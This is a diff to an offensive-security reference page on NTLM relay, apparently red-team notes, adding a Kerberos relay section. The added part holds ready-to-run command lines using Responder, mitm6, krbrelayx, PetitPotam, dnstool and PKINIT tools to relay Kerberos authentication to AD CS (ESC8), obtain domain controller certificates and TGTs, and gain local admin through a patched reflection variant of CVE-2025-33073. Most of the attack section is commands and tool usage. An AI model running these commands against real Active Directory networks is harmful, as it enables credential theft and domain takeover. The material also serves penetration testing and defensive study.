@@ -1,10 +1,10 @@
 ---
 title: Internal - NTLM Relay
 type: technique
-tags: [active-directory, exploitation, lateral-movement, ntlm, reference-import, relay]
+tags: [active-directory, exploitation, kerberos, lateral-movement, ntlm, reference-import, relay]
 phase: exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-14
+date_updated: 2026-09-10
 sources: [InternalAllTheThings, git-cve-2026-24294]
 ---
 
@@ -325,6 +325,87 @@ nxc smb TARGET.domain.local -u username -p 'P@ssw0rd' -M coerce_plus -o M=Petitp
 petitpotam.py -d domain.local -u username -p 'password' "TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "TARGET.DOMAIN.LOCAL"
 ```
 
+## Kerberos Relay (krbrelayx)
+
+Kerberos relay attacks intercept a Kerberos AP-REQ sent to an attacker-controlled listener and relay it to a target service, exploiting the fact that Kerberos does not bind the authentication to the underlying channel when channel binding is absent. An attacker triggers a victim machine to perform Kerberos authentication to the attacker (via LLMNR poisoning, WebDAV coercion, or mDNS) then uses tools like krbrelayx to relay the AP-REQ to a target service such as an AD CS enrollment endpoint (ESC8) or an LDAP server. This attack is particularly effective against services that accept Kerberos but do not enforce channel binding or LDAP signing.
+
+### Kerberos Relay over HTTP
+
+**Requirements**: Kerberos authentication for services without signing; HTTP through multicast poisoning (LLMNR).
+
+* An attacker sets up an LLMNR poisoner on the multicast range.
+* An HTTP client on the multicast range fails to resolve a hostname. This can happen because of a typo in a browser, a misconfiguration, but this can also be triggered by an attacker via WebDav coercion.
+* The LLMNR poisoner indicates that the hostname resolves to the attacker’s machine. In the LLMNR response, the answer name differs from the query and corresponds to an arbitrary relay target.
+* The victim performs a request on the attacker web server, which requires Kerberos authentication.
+* The victim asks for a ST with the SPN of the relay target. It then sends the resulting AP-REQ to the attacker web server.
+* The attacker extracts the AP-REQ and relays it to a service of the relay target.
+
+**Example**: ESC8 with Kerberos Relay
+
+```ps1
+python3 Responder.py -I eth0 -N <PKI_SERVER_NETBIOS_NAME>
+sudo python3 krbrelayx.py --target 'http://<PKI_SERVER>.<DOMAIN.LOCAL>/certsrv/' -ip <ATTACKER_IP> --adcs --template User -debug
+```
+
+### Kerberos Relay over DNS
+
+Abuses the DNS Secure Dynamic Updates in Active Directory.
+
+* [dirkjanm/mitm6](https://github.com/dirkjanm/mitm6)
+* [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
+* [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)
+
+**Steps**:
+
+* The client queries for the Start Of Authority (SOA) record for it’s name, which indicates which server is authoritative for the domain the client is in.
+* The server responds with the DNS server that is authorative, in this case the DC icorp-dc.internal.corp.
+* The client attempts a dynamic update on the A record with their name in the zone internal.corp.
+* This dynamic update is refused by the server because no authentication is provided.
+* The client uses a TKEY query to negotiate a secret key for authenticated queries.
+* The server answers with a TKEY Resource Record, which completes the authentication.
+* The client sends the dynamic update again, but now accompanied by a TSIG record, which is a signature using the key established in steps 5 and 6.
+* The server acknowledges the dynamic update. The new DNS record is now in place.
+
+```ps1
+# Example - Relay to ADCS - ESC8
+sudo krbrelayx.py --target http://adscert.internal.corp/certsrv/ -ip 192.168.111.80 --victim icorp-w10.internal.corp --adcs --template Machine
+sudo mitm6 --domain internal.corp --host-allowlist icorp-w10.internal.corp --relay adscert.internal.corp -v
+python gettgtpkinit.py -pfx-base64 MIIRFQIBA..cut...lODSghScECP5hGFE3PXoz internal.corp/icorp-w10$ icorp-w10.ccache
+```
+
+### Kerberos Relay over SMB
+
+Abuses the way SMB clients construct SPNs when asking for a ST.
+
+* [cube0x0/KrbRelay](https://github.com/cube0x0/KrbRelay) - Framework for Kerberos relaying.
+* [decoder-it/KrbRelayEx-RPC](https://github.com/decoder-it/KrbRelayEx-RPC) - Kerberos Relay and Forwarder for (Fake) RPC/DCOM MiTM Server.
+
+```ps1
+dnstool.py -u "DOMAIN.LOCAL\\user" -p "pass" -r "pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.10.10" --action add "10.10.10.11" --tcp
+petitpotam.py -u 'user' -p 'pass' -d DOMAIN.LOCAL 'pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' dc.domain.local
+krbrelayx.py -t 'http://pki.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC$'
+gettgtpkinit.py -cert-pfx 'DC$.pfx' 'DOMAIN.LOCAL/DC$' DC.ccache
+```
+
+### Kerberos Reflection Variant (CVE-2025-33073)
+
+The reflective relay trick from the NTLM Reflection section above also works as a pure Kerberos relay via krbrelayx, granting local admin privilege on the target. It requires a small patch: edit `krbrelayx/lib/servers/smbrelayserver.py` and remove these lines
+
+```ps1
+156: blob['tokenOid'] = '1.3.6.1.5.5.2'
+157: blob['innerContextToken']['mechTypes'].extend([MechType(TypesMech['KRB5 - Kerberos 5']),
+                                               MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5']),
+                                               MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'])])
+```
+
+Start the relay to catch the callback from TARGET, then trigger the callback to `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` (DNS-record setup as in the NTLM Reflection section above); `wspcoerce` is an additional trigger:
+
+```ps1
+krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
+krbrelayx.py --target smb://target.lab.redteam -c whoam
+wspcoerce 'lab.redteam/user:password@target.lab.redteam' file:////target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path
+```
+
 ## Relaying with WebDav Trick
 
 > Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB
@@ -504,16 +585,22 @@ wmiexec-pro.py lab.local/admin@target.lab.local service -action getinfo -service
 
 ## References
 
+* [A Look in the Mirror - The Reflective Kerberos Relay Attack - RedTeam Pentesting - June 11, 2025](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/)
 * [Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx - Quentin Roland - January 27, 2025](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with)
 * [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
 * [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema - June 13, 2019](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
+* [From NTLM relay to Kerberos relay: Everything you need to know - Decoder - April 24, 2025](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)
 * [Lateral Movement – WebClient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
 * [NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073 - Wilfried Bécard and Guillaume André - June 11, 2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
 * [NTLM Relaying to LDAP - The Hail Mary of Network Compromise - @logangoins - July 23, 2024](https://logan-goins.com/2024-07-23-ldap-relay/)
 * [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
 * [Relay Your Heart Away - An OPSEC-Conscious Approach to 445 Takeover - Nick Powers (@zyn3rgy) - Aug 1, 2024](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac)
 * [Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover - Nick Powers (@zyn3rgy) - July 27, 2024](https://www.youtube.com/watch?v=iBqOOkQGJEA)
+* [Relaying Kerberos over DNS using krbrelayx and mitm6 - Dirk-jan Mollema - February 22, 2022](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
+* [Relaying Kerberos over SMB using krbrelayx - Hugo Vincent - November 20, 2024](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx)
 * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher - Mar 9, 2018](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
+* [Using Kerberos for Authentication Relay Attacks - James Forshaw - October 20, 2021](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
+* [Windows Exploitation Tricks: Relaying DCOM Authentication - James Forshaw - October 20, 2021](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html)
 
 ## Bypasses and variants
 
